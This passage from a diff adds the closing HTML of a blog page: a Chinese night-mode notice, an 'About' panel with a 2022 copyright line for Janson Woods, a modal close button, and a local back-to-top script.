+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            SCS
+          </div>
+          <div class="panel-body">
+            Copyright © 2022 Janson Woods All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
